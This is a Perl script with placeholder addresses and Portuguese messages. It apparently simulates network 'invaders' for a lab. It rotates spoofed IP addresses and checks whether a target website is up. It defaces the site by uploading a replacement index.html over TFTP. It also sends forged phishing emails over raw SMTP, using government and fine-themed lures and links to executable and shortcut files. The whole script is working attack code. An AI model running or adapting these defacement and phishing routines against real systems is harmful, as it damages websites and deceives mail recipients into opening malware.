#!/usr/bin/perl

use strict;

use strict;
use Net::Telnet;
use Net::TFTP;

my $gateway = "_ipgw_";

my $usr = 0;

my $rede = "_iprede_";

my @ips;
my $b = 50;
for (my $i = 0; $i <= 5; $i++) {
   my $b4 = int(rand(20)+$b); 
   if ($b4 % 2 == 0) {
      $b4--;
   }
   $ips[$i] = $rede.".".$b4;
   $b += 20;
}

system("clear");


while (1) {

   $usr++;

   system("ifconfig eth0 ".$ips[$usr-1]." ");
   system("route add default gw $gateway");

   print ("---Invasor $usr: -------------------------------------------------------\n");

   print ("- Vou acessar www._dominio_ ...\n");

   system("rm /tmp/saida.txt 2> /dev/null");
   system("wget --timeout=5 --tries=1 http://www._dominio_ -O /tmp/saida.txt 2> /dev/null");
   my $encontrou = 0;
   open (SAIDA, "/tmp/saida.txt");
   while (my $l = <SAIDA>) {
      if ($l =~ /_dominio_/i) {
         $encontrou = 1;
      }
   } 
   close (SAIDA);  

   if ($encontrou) {
      print ("- Que site feio, alguém poderia hackear!                      $usr  >:(\n");
   } else {
      print ("- Hackearam/Derrubaram o site! Kkkkkk!                        $usr  >:)\n");
   }

   my $tftp;

   $tftp = Net::TFTP->new("_ipweb_", Retries => 1);
   $tftp->ascii;
   system("echo \'Que site Feio - owned kkkkk\' > /tmp/index.html");
   $tftp->put("/tmp/index.html","index.html");

   sleep(2);
   
   $usr++;

   system("ifconfig eth0 ".$ips[$usr-1]." ");
   system("route add default gw $gateway");

   print ("---Invasor $usr: -------------------------------------------------------\n");

   print ("- Vou mandar um SPAM para contato\@_dominio_ ...\n");

   my @nomes = ("ariberto","bianca","carlos","daiana","elisa","fabio","gilson","horacio","josivaldo","kleber","leticia","mirian","naiara","olga","pablo","renata","sergio","tulio","vanessa","wanda","zohan");
   my $rn = int(rand(scalar(@nomes)));
   my @dominios = ("gmail.com","hotmail.com","yahoo.com","ig.com.br","bol.com.br","outlook.com");
   my $rd = int(rand(scalar(@dominios)));
   my @palavras = ("Pilulas para Emagrecer","Aumente a Sua Renda","Ajude a Gente","Ganhe na Loteria","Viva por 200 anos","Receita Federal","Multa Detran","Volte Sempre","Esta te Traindo");
   my @links = ("pil.cn/download.apk","rnda.ru/rico.exe","help.tw/pp.docx","vegas.hz/winners.bat","live.tv/thous.zip","govbr.sa/cpf.lnk","to.me/detran.exe","back.to/vs.apk","link.me/traicao.png.lnk");
   my $rp = int(rand(scalar(@palavras)));

   my $nomecontato = ucfirst($nomes[$rn]);
   my $mailcontato = $nomes[$rn]."\@".$dominios[$rd];
   my $assunto = $palavras[$rp];
   my $link = $links[$rp];

   my $falhas = 0;
   my $t;
   
   eval {
      my $t = new Net::Telnet (Timeout => 5, Host => 'mail._dominio_', Port => 25, Prompt => '/./') or $falhas = 1;
      $t->open() or $falhas = 1;
      my $cmd = "ehlo _dominio_\n";
      $cmd .= "mail from: $mailcontato\n";
      $cmd .= "rcpt to: contato\@_dominio_\n";
      $cmd .= "data\n";
      $cmd .= "From: $mailcontato\n";
      $cmd .= "To: contato\@_dominio_\n";
      $cmd .= "Subject: Urgente! $assunto!\n\n";
      $cmd .= "Ola contato,\n\n";
      $cmd .= "$assunto! Urgente!\n";
      $cmd .= "Acesse o link ao lado: http://$link\n\n";
      $cmd .= "atenciosamente\n\n";
      $cmd .= "$nomecontato\n";
      $cmd .= "\n\n.\n\nquit\n\n";
      $t->cmd($cmd) or $falhas = 1;
      $t->close;
   } or do {
      $falhas = 1;
   };

   if ($falhas == 0) {
      print ("- Enviei um SPAM normalmente! Kkkk                            $usr  >:)\n");
   } else {
      print ("- Não consegui enviar o SPAM! Arghh!                          $usr  >:(\n");
   }

   sleep(2);

   if ($usr >= 6) {
      $usr = 0;
   }

}
